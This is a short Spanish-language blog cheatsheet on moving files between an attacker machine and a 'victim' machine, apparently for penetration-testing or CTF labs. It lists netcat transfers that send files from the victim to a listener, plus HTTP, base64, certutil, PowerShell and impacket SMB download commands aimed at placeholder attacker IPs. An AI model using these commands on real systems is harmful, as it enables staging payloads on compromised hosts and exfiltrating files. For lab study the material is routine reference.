---
title: Cheatsheet para pasar archivos en bash
---
El propio nombre dice de lo que va este post: Como pasarse archivos entre máquinas.

### [](https://viksant.hashnode.dev/cheatsheet-pasar-archivos#heading-netcat "Permalink")Netcat

``` bash
# Maquina victima
nc <Local_ip> <port> < file
# En local
nc -lvp <IP> > file
```
-------

### [](https://viksant.hashnode.dev/cheatsheet-pasar-archivos#heading-http "Permalink")Http

``` python
# Python
# En local: 
python -m http.server 
# En remoto:
curl/wget IP:Puerto/archivo # Usar -o si se usa curl

# Apache
# En local:
cp archivo.txt /var/www/html
# En remoto
curl/wget IP:Puerto/archivo # Usar -o si se usa curl

#Local
python -m http.server 80
# En remoto
wget <ip>/<archivo>
```
-------
#python 
### [](https://viksant.hashnode.dev/cheatsheet-pasar-archivos#heading-base64 "Permalink")Base64


``` bash
# Pasar el archivo a base64:
cat <file> | base64
# Lo pegamos en la maquina victima:
echo "texto_base_64" | base64 -d > <file># Para guardarlo dentro de un archivo
```
-------

### [](https://viksant.hashnode.dev/cheatsheet-pasar-archivos#heading-windows "Permalink")Windows

``` 
# Primero creo un sv http con python y luego:
certutil.exe -f -urlcache -split http://<IP>/<file>

# Con servidor python en local y esto en remoto:
IWR -uri http://<ip>/<file> -OutFile <file_name>

# Otras opciones:
    # 1
powershell.exe -command iwr -Uri http://<ip>/<file> -OutFile <destino_output_file>
    # 2
powershell.exe iwr -uri http://<ip>/<file> -o <output_dest>

# Con curl y wget
curl http://ip/file -o <output>
wget http://ip/file -OutFile <output>

# Powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://ip/file', '<output>')

# Servidor SMB
    # Primero te montas una shared folder con impacket-smb
impacket-smbserver share $(pwd) -smb2support
    # Y luego te lo descargas
impacket-smbserver share <file_path> -smb2support
copy \\ip\share\<file>
```